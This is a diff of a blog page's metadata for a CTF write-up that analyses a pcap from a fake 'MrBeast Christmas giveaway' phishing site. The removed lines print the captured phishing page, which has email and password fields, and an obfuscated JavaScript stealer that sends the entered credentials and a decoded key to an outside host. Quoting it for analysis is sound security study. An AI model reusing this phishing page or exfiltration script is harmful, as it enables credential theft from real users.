@@ -237,7 +237,7 @@ This is basically obfuscated javascript. Let&rsquo;s try to deobfuscate it and m
 For this purpose, we can use the online tool:">
 <meta name="author" content="connar">
 <link rel="canonical" href="https://connar.github.io/ctfwriteups/xmasgiveaway/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6da9a63d25a9608bca2f7f907a030e887a7dd3c3f3918e4cc113129361414bda.css" integrity="sha256-bammPSWpYIvKL3&#43;QegMOiHp908PzkY5MwRMSk2FBS9o=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://connar.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
@@ -282,242 +282,22 @@ For this purpose, we can use the online tool:">
         }
 
     </style>
-</noscript><meta property="og:title" content="Mr Beast Xmas Giveaway - Writeup" />
-<meta property="og:description" content="Starting the analysis
-A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.
+</noscript>
+<meta property="og:url" content="https://connar.github.io/ctfwriteups/xmasgiveaway/">
+  <meta property="og:site_name" content="Journal of Connar">
+  <meta property="og:title" content="Mr Beast Xmas Giveaway - Writeup">
+  <meta property="og:description" content="Starting the analysis A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.
 Opening the file with Wireshark, we can view all the requests.
 The request that is of interest is the one made to themrbeas7.org and is the following:
-GET /christmasGiveaway/index.html HTTP/1.1
-Host: themrbeas7.org
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: none
-Sec-Fetch-User: ?1
-
-HTTP/1.0 200 OK
-Server: Apache/2.4.43 (FreeBSD)
-Date: Mon, 04 Dec 2023 10:09:52 GMT
-Content-type: text/html
-Content-Length: 10649
-Last-Modified: Sun, 03 Dec 2023 17:25:38 GMT
-
-&lt;!DOCTYPE html&gt;
-
-&lt;html&gt;
-
-	&lt;head&gt;
-		&lt;meta charset=&#34;UTF-8&#34;&gt;
-		&lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
-	    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
-		&lt;link rel=&#34;shortcut icon&#34; href=&#34;img/Favicon.png&#34; type=&#34;image/x-icon&#34;&gt;
-		&lt;title&gt;Xmas Giveaway&lt;/title&gt;
-
-		&lt;script type=&#34;text/javascript&#34; src=&#34;js/jquery.js&#34;&gt;&lt;/script&gt;
-		&lt;script type=&#34;text/javascript&#34; src=&#34;js/bootstrap.min.js&#34;&gt;&lt;/script&gt;
-		&lt;script type=&#34;text/javascript&#34; src=&#34;js/timer.js&#34;&gt;&lt;/script&gt;
-		&lt;script type=&#34;text/javascript&#34; src=&#34;js/script.js&#34;&gt;&lt;/script&gt;
-		&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/bootstrap.css&#34;&gt;
-		&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/bootstrap.min.css&#34;&gt;
-		&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/font-awesome.min.css&#34;&gt;
-		&lt;link href=&#39;http://fonts.googleapis.com/css?family=Lobster&#39; rel=&#39;stylesheet&#39; type=&#39;text/css&#39;&gt;
-		&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/custom.css&#34;&gt;
-	&lt;/head&gt;
-
-
-	&lt;body onload=&#34;countdown(year,month,day,hour,minute)&#34;&gt;
-		&lt;!-- Carousel --&gt;
-		&lt;div id=&#34;myCarousel&#34; class=&#34;carousel slide&#34; data-ride=&#34;carousel&#34;&gt;
-		    &lt;!-- Indicators --&gt;
-		    &lt;ol class=&#34;carousel-indicators&#34;&gt;
-		        &lt;li data-target=&#34;#myCarousel&#34; data-slide-to=&#34;0&#34; class=&#34;active&#34;&gt;&lt;/li&gt;
-		        &lt;li data-target=&#34;#myCarousel&#34; data-slide-to=&#34;1&#34; &gt;&lt;/li&gt;
-		        &lt;li data-target=&#34;#myCarousel&#34; data-slide-to=&#34;2&#34;&gt;&lt;/li&gt;
-		    &lt;/ol&gt;
-		    &lt;div class=&#34;carousel-inner&#34;&gt;
-		    	&lt;div class= &#34;container timer&#34;&gt;
-		    		&lt;div id=&#34;home&#34; class= &#34;logo text-center&#34;&gt;
-		    			&lt;h1&gt;&lt;font color=&#34;red&#34;&gt;Christmas is almost here&lt;/font&gt;&lt;/h1&gt;
-		   			&lt;/div&gt;
-			    	&lt;div class= &#34;row timer-circle&#34;&gt;
-			    		&lt;div class= &#34;main-text text-center&#34;&gt;
-			    			&lt;h2 class=&#34;sub-text&#34;&gt;Giveaway countdown&lt;/h2&gt;
-			    		&lt;/div&gt;
-			    		&lt;div class=&#34;text-center&#34;&gt;
-							&lt;div class=&#34;numbers&#34; id=&#34;count2&#34;&gt;&lt;/div&gt;
-						&lt;/div&gt;
-						&lt;div class= &#34;col-lg-12 col-md-12 col-sm-12 col-xs-12 text-center&#34;&gt;
-							&lt;div class= &#34;circle text-center&#34;&gt;
-								&lt;div class= &#34;row&#34; id= &#34;spacer1&#34;&gt;
-									&lt;div class= &#34;title&#34;&gt;&lt;/div&gt;
-									&lt;div class= &#34;numbers&#34; id= &#34;dday&#34;&gt;&lt;/div&gt;
-								&lt;/div&gt;
-								&lt;div class= &#34;row&#34; id= &#34;spacer2&#34;&gt;
-									&lt;div class= &#34;title&#34;&gt;&lt;/div&gt;
-									&lt;div class= &#34;title&#34; id= &#34;days&#34;&gt;Day&lt;/div&gt;
-								&lt;/div&gt;
-							&lt;/div&gt;
-							&lt;div class= &#34;circle text-center&#34;&gt;
-								&lt;div class= &#34;row&#34; id= &#34;spacer1&#34;&gt;
-									&lt;div class= &#34;title&#34;&gt;&lt;/div&gt;
-									&lt;div class= &#34;numbers&#34; id= &#34;dhour&#34;&gt;&lt;/div&gt;
-								&lt;/div&gt;
-								&lt;div class= &#34;row&#34; id= &#34;spacer2&#34;&gt;
-									&lt;div class= &#34;title&#34;&gt;&lt;/div&gt;
-									&lt;div class= &#34;title&#34; id= &#34;hours&#34;&gt;Hr&lt;/div&gt;
-								&lt;/div&gt;
-							&lt;/div&gt;
-							&lt;div class= &#34;circle text-center&#34;&gt;
-								&lt;div class= &#34;row&#34; id= &#34;spacer1&#34;&gt;
-									&lt;div class= &#34;title&#34;&gt;&lt;/div&gt;
-									&lt;div class= &#34;numbers&#34; id= &#34;dmin&#34;&gt;&lt;/div&gt;
-								&lt;/div&gt;
-								&lt;div class= &#34;row&#34; id= &#34;spacer2&#34;&gt;
-									&lt;div class= &#34;title&#34;&gt;&lt;/div&gt;
-									&lt;div class= &#34;title&#34; id= &#34;minutes&#34;&gt;Min&lt;/div&gt;
-								&lt;/div&gt;
-							&lt;/div&gt;
-							&lt;div class= &#34;circle text-center&#34;&gt;
-								&lt;div class= &#34;row&#34; id= &#34;spacer1&#34;&gt;
-									&lt;div class= &#34;title&#34;&gt;&lt;/div&gt;
-									&lt;div class= &#34;numbers&#34; id= &#34;dsec&#34;&gt;&lt;/div&gt;
-								&lt;/div&gt;
-								&lt;div class= &#34;row&#34; id= &#34;spacer2&#34;&gt;
-									&lt;div class= &#34;title&#34;&gt;&lt;/div&gt;
-									&lt;div class= &#34;title&#34; id= &#34;seconds&#34;&gt;Sec&lt;/div&gt;
-								&lt;/div&gt;
-							&lt;/div&gt;
-						&lt;/div&gt;&lt;!-- end of clock --&gt;
-			    	&lt;/div&gt;&lt;!-- end of timer-circle --&gt;
-		    	&lt;/div&gt;&lt;!-- end of timer --&gt;
-			    	
-		        &lt;div class=&#34;item active&#34;&gt;
-		        	&lt;img src=&#34;img/mrBeast.jpg&#34; alt=&#34;First slide&#34;&gt;
-		        	
-					&lt;div class= &#34;carousel-caption caption&#34;&gt;
-						&lt;h1&gt;The biggest christmas giveaway is on its way...&lt;/h1&gt;
-					&lt;/div&gt;
-		        &lt;/div&gt;&lt;!-- end of first item --&gt;
-		        &lt;div class=&#34;item&#34;&gt;
-		          	&lt;img src=&#34;img/santa.jpg&#34; alt=&#34;Second slide&#34;&gt;
-		          	
-					&lt;div class= &#34;carousel-caption caption&#34;&gt;
-						&lt;h1&gt;You may be one of the lucky ones that will meet Santa...&lt;/h1&gt;
-					&lt;/div&gt;
-		        &lt;/div&gt;&lt;!-- end of second item --&gt;
-		        &lt;div class=&#34;item&#34;&gt;
-			        &lt;img src=&#34;img/elfs.jpeg&#34; alt=&#34;Third slide&#34;&gt;
-			        
-					&lt;div class= &#34;carousel-caption caption&#34;&gt;
-						&lt;h1&gt;Subscribe! The Mr. Beast team is waiting to meet you!&lt;/h1&gt;
-					&lt;/div&gt;        
-		        &lt;/div&gt;&lt;!-- end of third item --&gt;
-		    &lt;/div&gt;
-		&lt;/div&gt;&lt;!-- end of carousel --&gt;
-
-		&lt;div class= &#34;body-content&#34;&gt;
-			&lt;!-- subscribe --&gt;
-			&lt;div class= &#34;container subscribe&#34;&gt;
-				&lt;div class=&#34;row text-center&#34;&gt;
-					&lt;div class= &#34;col-lg-6 col-lg-offset-3 subscribe-text&#34;&gt;
-						&lt;h3 class= &#34;text-center&#34;&gt;Subscribe&lt;/h3&gt;
-						&lt;hr class= &#34;full&#34;&gt;
-	                	&lt;p&gt;Welcome to the biggest ever giveaway by the Mr. Beast team!&lt;/p&gt;
-	                	&lt;br/&gt;
-					&lt;/div&gt;
-				&lt;/div&gt;
-			&lt;/div&gt;&lt;!-- end of subscribe --&gt;
-			&lt;div class= &#34;container after-slide&#34;&gt;
-				&lt;div class= &#34;row&#34;&gt;
-					&lt;div class=&#34;col-md-6 col-md-offset-3 col-lg-8 col-lg-offset-2 col-sm-12 col-xs-12 text-center&#34;&gt;
-						&lt;p class= &#34;after-slide-text&#34;&gt;Secure your chance to win a fully paid trip to the North Pole by registering now! Don&#39;t miss out on the opportunity to be among the exclusive group of participants eligible for this exciting giveaway. Register your account today for a chance at winning this exclusive trip and meeting Santa Claus in person!&lt;/p&gt;
-					&lt;/div&gt;
-				&lt;/div&gt;
-				&lt;div class=&#34;subscribe-form&#34; &gt;
-					&lt;div class= &#34;row&#34;&gt;
-						&lt;div class=&#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center&#34;&gt;
-						  	&lt;span class=&#34;input-group-addon&#34;&gt;&lt;i class=&#34;fa fa-envelope-o fa-fw&#34;&gt;&lt;/i&gt;&lt;/span&gt;
-						  	&lt;input class=&#34;form-control&#34; type=&#34;text&#34; placeholder=&#34;Email address&#34;&gt;
-						&lt;/div&gt;
-						&lt;div class=&#34;input-group col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center form&#34;&gt;
-						  	&lt;span class=&#34;input-group-addon&#34;&gt;&lt;i class=&#34;fa fa-key fa-fw&#34;&gt;&lt;/i&gt;&lt;/span&gt;
-						  	&lt;input class=&#34;form-control&#34; type=&#34;password&#34; placeholder=&#34;Password&#34;&gt;
-						&lt;/div&gt;
-						&lt;div class=&#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12&#34;&gt;
-							&lt;button type=&#34;button&#34; class=&#34;btn btn-info&#34;&gt;Subscribe&lt;/button&gt;
-						&lt;/div&gt;
-					&lt;/div&gt;
-				&lt;/div&gt;
-			&lt;/div&gt;&lt;!-- end of after slide part --&gt;
-
-	        &lt;!-- share part --&gt;
-	      	&lt;div class=&#34;container share&#34;&gt;
-				&lt;div class=&#34;row text-center&#34;&gt;
-					&lt;div class= &#34;col-lg-6 col-lg-offset-3 share-text&#34;&gt;
-						&lt;h3 class= &#34;text-center&#34;&gt;Our Socials&lt;/h3&gt;
-						&lt;hr class= &#34;full&#34;&gt;
-	                	&lt;p&gt;Find us at our social media platforms to be updated about the results&lt;/p&gt;
-	                	&lt;br/&gt;
-					&lt;/div&gt;
-				&lt;/div&gt;
-			&lt;/div&gt;
-			&lt;div class= &#34;container share-icons text-center&#34;&gt;
-				&lt;div class= &#34;row text-center&#34;&gt;
-					&lt;div class= &#34;col-lg-12 col-md-12 col-sm-12 col-xs-12&#34;&gt;
-						&lt;ul class=&#34;socials-icons col-lg-12 col-md-12 col-sm-12 col-xs-12&#34;&gt;
-							&lt;li&gt;
-								&lt;a href=&#34;https://www.facebook.com/MrBeast6000&#34; data-toggle=&#34;tooltip&#34; title=&#34;Share in Facebook&#34; class=&#34;facebook&#34;&gt;&lt;i class=&#34;fa fa-facebook&#34;&gt;&lt;/i&gt;&lt;/a&gt;
-							&lt;/li&gt;
-							&lt;li&gt;
-								&lt;a href=&#34;https://twitter.com/mrbeast?lang=en&#34; data-toggle=&#34;tooltip&#34; title=&#34;Share in Twitter&#34; class=&#34;twitter&#34;&gt;&lt;i class=&#34;fa fa-twitter&#34;&gt;&lt;/i&gt;&lt;/a&gt;
-							&lt;/li&gt;
-							&lt;li&gt;
-								&lt;a href=&#34;https://www.instagram.com/mrbeast/?hl=en&#34; data-toggle=&#34;tooltip&#34; title=&#34;Share in Instagram&#34; class=&#34;instagram&#34;&gt;&lt;i class=&#34;fa fa-instagram&#34;&gt;&lt;/i&gt;&lt;/a&gt;
-							&lt;/li&gt;
-						&lt;/ul&gt; 
-					&lt;/div&gt;
-				&lt;/div&gt;
-			&lt;/div&gt;&lt;!-- end of share part --&gt;
-	    &lt;/div&gt;&lt;!-- end of body content --&gt;
-		&lt;!-- footer --&gt;
-		&lt;div class=&#34;wrapper footer&#34;&gt;
-			&lt;div class=&#34;container&#34;&gt;
-				&lt;div class=&#34;row text-center&#34;&gt;
-					&lt;div class=&#34;name col-lg-2 col-md-2 col-sm-2 col-xs-12 text-center&#34;&gt;
-						&lt;h1&gt;Giveaway&lt;/h1&gt;
-					&lt;/div&gt;
-					&lt;div class=&#34;col-lg-8 col-md-8 col-sm-8 col-xs-12 text-center&#34;&gt;
-						&lt;div class=&#34;copyright&#34;&gt;
-							&amp;copy; Mr.Beast Team
-						&lt;/div&gt;
-					&lt;/div&gt;
-					&lt;div class= &#34;col-lg-2 col-md-2 col-sm-2 col-xs-12&#34; id=&#34;back-top&#34;&gt;
-						&lt;p class= &#34;pull-right&#34;&gt;&lt;a href=&#34;#home&#34;&gt;&lt;span&gt;&lt;/span&gt;Top&lt;/a&gt;&lt;/p&gt;	
-					&lt;/div&gt;	
-				&lt;/div&gt;&lt;!-- row --&gt;
-			&lt;/div&gt;
-		&lt;/div&gt;&lt;!--end of footer --&gt;
-	&lt;/body&gt;
-&lt;/html&gt;
-&lt;script&gt;
-function _0x299a(_0xa725a8,_0x48ecb7){var _0x33465e=_0x3346();return _0x299a=function(_0x299a8c,_0x4edf29){_0x299a8c=_0x299a8c-0x7f;var _0x3b4711=_0x33465e[_0x299a8c];return _0x3b4711;},_0x299a(_0xa725a8,_0x48ecb7);}var _0x52de18=_0x299a;function _0x3346(){var _0x1cd6fe=[&#39;length&#39;,&#39;.subscribe-form\x20.form-control[type=\x22password\x22]&#39;,&#39;click&#39;,&#39;10GjwUiH&#39;,&#39;283448ojrvqi&#39;,&#39;PSkvNyoILFxaI0BVW0M&#43;RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec&#39;,&#39;.subscribe-form\x20.btn.btn-info&#39;,&#39;GET&#39;,&#39;11wIJUzs&#39;,&#39;385aGCgYF&#39;,&#39;203916QRBBAJ&#39;,&#39;addEventListener&#39;,&#39;186854HAAPmi&#39;,&#39;DOMContentLoaded&#39;,&#39;push&#39;,&#39;34662TcBphL&#39;,&#39;join&#39;,&#39;open&#39;,&#39;value&#39;,&#39;querySelector&#39;,&#39;charCodeAt&#39;,&#39;5003910eMoXPe&#39;,&#39;945368MfXSkw&#39;,&#39;9CofhOF&#39;,&#39;&amp;apikey=&#39;,&#39;https://storage.appssec.co.ind?email=&#39;,&#39;send&#39;,&#39;724557XgnpSv&#39;];_0x3346=function(){return _0x1cd6fe;};return _0x3346();}(function(_0x104a86,_0xa6db47){var _0x4c8d43=_0x299a,_0xf91101=_0x104a86();while(!![]){try{var _0x29d6b2=-parseInt(_0x4c8d43(0x8c))/0x1&#43;parseInt(_0x4c8d43(0x94))/0x2&#43;-parseInt(_0x4c8d43(0x87))/0x3&#43;-parseInt(_0x4c8d43(0x92))/0x4*(parseInt(_0x4c8d43(0x8b))/0x5)&#43;parseInt(_0x4c8d43(0x97))/0x6*(parseInt(_0x4c8d43(0x91))/0x7)&#43;-parseInt(_0x4c8d43(0x82))/0x8*(parseInt(_0x4c8d43(0x83))/0x9)&#43;parseInt(_0x4c8d43(0x81))/0xa*(parseInt(_0x4c8d43(0x90))/0xb);if(_0x29d6b2===_0xa6db47)break;else _0xf91101[&#39;push&#39;](_0xf91101[&#39;shift&#39;]());}catch(_0x4597d0){_0xf91101[&#39;push&#39;](_0xf91101[&#39;shift&#39;]());}}}(_0x3346,0x28a39),document[_0x52de18(0x93)](_0x52de18(0x95),function(){var _0x3010de=_0x52de18;const _0x4c17d1=document[&#39;querySelector&#39;](_0x3010de(0x8e)),_0x5bc16f=document[_0x3010de(0x7f)](&#39;.subscribe-form\x20.form-control[type=\x22text\x22]&#39;),_0x106e8a=document[_0x3010de(0x7f)](_0x3010de(0x89));_0x4c17d1[_0x3010de(0x93)](_0x3010de(0x8a),function(){var _0xaf724a=_0x3010de;const _0x3a9d03=_0x5bc16f[_0xaf724a(0x9a)],_0x38e031=_0x106e8a[_0xaf724a(0x9a)];var _0x37a3bb=_0xaf724a(0x8d);function _0x2ae5a0(_0x49225f){var _0x4a91e4=_0xaf724a,_0x1d14ff=[&#39;s&#39;,&#39;a&#39;,&#39;n&#39;,&#39;t&#39;,&#39;a&#39;],_0x1bcfcc=[];input=atob(_0x49225f);for(var _0x4d4b2f=0x0;_0x4d4b2f&lt;input[_0x4a91e4(0x88)];_0x4d4b2f&#43;&#43;){var _0x41b22f=input[_0x4a91e4(0x80)](_0x4d4b2f)^_0x1d14ff[_0x4d4b2f%_0x1d14ff[_0x4a91e4(0x88)]][_0x4a91e4(0x80)](0x0);_0x1bcfcc[_0x4a91e4(0x96)](String[&#39;fromCharCode&#39;](_0x41b22f));}return _0x1bcfcc[_0x4a91e4(0x98)](&#39;&#39;);}function _0xe05049(){var _0x3ebbc9=_0xaf724a,_0x45261b=_0x3a9d03,_0x2bf34e=_0x38e031,_0x5ba78a=_0x2ae5a0(_0x37a3bb),_0x5b4edc=new XMLHttpRequest();_0x5b4edc[_0x3ebbc9(0x99)](_0x3ebbc9(0x8f),_0x3ebbc9(0x85)&#43;_0x45261b&#43;&#39;&amp;password=&#39;&#43;_0x2bf34e&#43;_0x3ebbc9(0x84)&#43;String(_0x5ba78a)),_0x5b4edc[_0x3ebbc9(0x86)]();}_0xe05049();});}));
-&lt;/script&gt;
-This request contains the index.html page of the themrbeas7.org website.
+GET /christmasGiveaway/index.html HTTP/1.1 Host: themrbeas7.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 HTTP/1.0 200 OK Server: Apache/2.4.43 (FreeBSD) Date: Mon, 04 Dec 2023 10:09:52 GMT Content-type: text/html Content-Length: 10649 Last-Modified: Sun, 03 Dec 2023 17:25:38 GMT &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; &lt;link rel=&#34;shortcut icon&#34; href=&#34;img/Favicon.png&#34; type=&#34;image/x-icon&#34;&gt; &lt;title&gt;Xmas Giveaway&lt;/title&gt; &lt;script type=&#34;text/javascript&#34; src=&#34;js/jquery.js&#34;&gt;&lt;/script&gt; &lt;script type=&#34;text/javascript&#34; src=&#34;js/bootstrap.min.js&#34;&gt;&lt;/script&gt; &lt;script type=&#34;text/javascript&#34; src=&#34;js/timer.js&#34;&gt;&lt;/script&gt; &lt;script type=&#34;text/javascript&#34; src=&#34;js/script.js&#34;&gt;&lt;/script&gt; &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/bootstrap.css&#34;&gt; &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/bootstrap.min.css&#34;&gt; &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/font-awesome.min.css&#34;&gt; &lt;link href=&#39;http://fonts.googleapis.com/css?family=Lobster&#39; rel=&#39;stylesheet&#39; type=&#39;text/css&#39;&gt; &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/custom.css&#34;&gt; &lt;/head&gt; &lt;body onload=&#34;countdown(year,month,day,hour,minute)&#34;&gt; &lt;!-- Carousel --&gt; &lt;div id=&#34;myCarousel&#34; class=&#34;carousel slide&#34; data-ride=&#34;carousel&#34;&gt; &lt;!-- Indicators --&gt; &lt;ol class=&#34;carousel-indicators&#34;&gt; &lt;li data-target=&#34;#myCarousel&#34; data-slide-to=&#34;0&#34; class=&#34;active&#34;&gt;&lt;/li&gt; &lt;li data-target=&#34;#myCarousel&#34; data-slide-to=&#34;1&#34; &gt;&lt;/li&gt; &lt;li data-target=&#34;#myCarousel&#34; data-slide-to=&#34;2&#34;&gt;&lt;/li&gt; &lt;/ol&gt; &lt;div class=&#34;carousel-inner&#34;&gt; &lt;div class= &#34;container timer&#34;&gt; &lt;div id=&#34;home&#34; class= &#34;logo text-center&#34;&gt; &lt;h1&gt;&lt;font color=&#34;red&#34;&gt;Christmas is almost here&lt;/font&gt;&lt;/h1&gt; &lt;/div&gt; &lt;div class= &#34;row timer-circle&#34;&gt; &lt;div class= &#34;main-text text-center&#34;&gt; &lt;h2 class=&#34;sub-text&#34;&gt;Giveaway countdown&lt;/h2&gt; &lt;/div&gt; &lt;div class=&#34;text-center&#34;&gt; &lt;div class=&#34;numbers&#34; id=&#34;count2&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;col-lg-12 col-md-12 col-sm-12 col-xs-12 text-center&#34;&gt; &lt;div class= &#34;circle text-center&#34;&gt; &lt;div class= &#34;row&#34; id= &#34;spacer1&#34;&gt; &lt;div class= &#34;title&#34;&gt;&lt;/div&gt; &lt;div class= &#34;numbers&#34; id= &#34;dday&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;row&#34; id= &#34;spacer2&#34;&gt; &lt;div class= &#34;title&#34;&gt;&lt;/div&gt; &lt;div class= &#34;title&#34; id= &#34;days&#34;&gt;Day&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;circle text-center&#34;&gt; &lt;div class= &#34;row&#34; id= &#34;spacer1&#34;&gt; &lt;div class= &#34;title&#34;&gt;&lt;/div&gt; &lt;div class= &#34;numbers&#34; id= &#34;dhour&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;row&#34; id= &#34;spacer2&#34;&gt; &lt;div class= &#34;title&#34;&gt;&lt;/div&gt; &lt;div class= &#34;title&#34; id= &#34;hours&#34;&gt;Hr&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;circle text-center&#34;&gt; &lt;div class= &#34;row&#34; id= &#34;spacer1&#34;&gt; &lt;div class= &#34;title&#34;&gt;&lt;/div&gt; &lt;div class= &#34;numbers&#34; id= &#34;dmin&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;row&#34; id= &#34;spacer2&#34;&gt; &lt;div class= &#34;title&#34;&gt;&lt;/div&gt; &lt;div class= &#34;title&#34; id= &#34;minutes&#34;&gt;Min&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;circle text-center&#34;&gt; &lt;div class= &#34;row&#34; id= &#34;spacer1&#34;&gt; &lt;div class= &#34;title&#34;&gt;&lt;/div&gt; &lt;div class= &#34;numbers&#34; id= &#34;dsec&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;row&#34; id= &#34;spacer2&#34;&gt; &lt;div class= &#34;title&#34;&gt;&lt;/div&gt; &lt;div class= &#34;title&#34; id= &#34;seconds&#34;&gt;Sec&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- end of clock --&gt; &lt;/div&gt;&lt;!-- end of timer-circle --&gt; &lt;/div&gt;&lt;!-- end of timer --&gt; &lt;div class=&#34;item active&#34;&gt; &lt;img src=&#34;img/mrBeast.jpg&#34; alt=&#34;First slide&#34;&gt; &lt;div class= &#34;carousel-caption caption&#34;&gt; &lt;h1&gt;The biggest christmas giveaway is on its way...&lt;/h1&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- end of first item --&gt; &lt;div class=&#34;item&#34;&gt; &lt;img src=&#34;img/santa.jpg&#34; alt=&#34;Second slide&#34;&gt; &lt;div class= &#34;carousel-caption caption&#34;&gt; &lt;h1&gt;You may be one of the lucky ones that will meet Santa...&lt;/h1&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- end of second item --&gt; &lt;div class=&#34;item&#34;&gt; &lt;img src=&#34;img/elfs.jpeg&#34; alt=&#34;Third slide&#34;&gt; &lt;div class= &#34;carousel-caption caption&#34;&gt; &lt;h1&gt;Subscribe! The Mr. Beast team is waiting to meet you!&lt;/h1&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- end of third item --&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- end of carousel --&gt; &lt;div class= &#34;body-content&#34;&gt; &lt;!-- subscribe --&gt; &lt;div class= &#34;container subscribe&#34;&gt; &lt;div class=&#34;row text-center&#34;&gt; &lt;div class= &#34;col-lg-6 col-lg-offset-3 subscribe-text&#34;&gt; &lt;h3 class= &#34;text-center&#34;&gt;Subscribe&lt;/h3&gt; &lt;hr class= &#34;full&#34;&gt; &lt;p&gt;Welcome to the biggest ever giveaway by the Mr. Beast team!&lt;/p&gt; &lt;br/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- end of subscribe --&gt; &lt;div class= &#34;container after-slide&#34;&gt; &lt;div class= &#34;row&#34;&gt; &lt;div class=&#34;col-md-6 col-md-offset-3 col-lg-8 col-lg-offset-2 col-sm-12 col-xs-12 text-center&#34;&gt; &lt;p class= &#34;after-slide-text&#34;&gt;Secure your chance to win a fully paid trip to the North Pole by registering now! Don&#39;t miss out on the opportunity to be among the exclusive group of participants eligible for this exciting giveaway. Register your account today for a chance at winning this exclusive trip and meeting Santa Claus in person!&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;subscribe-form&#34; &gt; &lt;div class= &#34;row&#34;&gt; &lt;div class=&#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center&#34;&gt; &lt;span class=&#34;input-group-addon&#34;&gt;&lt;i class=&#34;fa fa-envelope-o fa-fw&#34;&gt;&lt;/i&gt;&lt;/span&gt; &lt;input class=&#34;form-control&#34; type=&#34;text&#34; placeholder=&#34;Email address&#34;&gt; &lt;/div&gt; &lt;div class=&#34;input-group col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center form&#34;&gt; &lt;span class=&#34;input-group-addon&#34;&gt;&lt;i class=&#34;fa fa-key fa-fw&#34;&gt;&lt;/i&gt;&lt;/span&gt; &lt;input class=&#34;form-control&#34; type=&#34;password&#34; placeholder=&#34;Password&#34;&gt; &lt;/div&gt; &lt;div class=&#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12&#34;&gt; &lt;button type=&#34;button&#34; class=&#34;btn btn-info&#34;&gt;Subscribe&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- end of after slide part --&gt; &lt;!-- share part --&gt; &lt;div class=&#34;container share&#34;&gt; &lt;div class=&#34;row text-center&#34;&gt; &lt;div class= &#34;col-lg-6 col-lg-offset-3 share-text&#34;&gt; &lt;h3 class= &#34;text-center&#34;&gt;Our Socials&lt;/h3&gt; &lt;hr class= &#34;full&#34;&gt; &lt;p&gt;Find us at our social media platforms to be updated about the results&lt;/p&gt; &lt;br/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;container share-icons 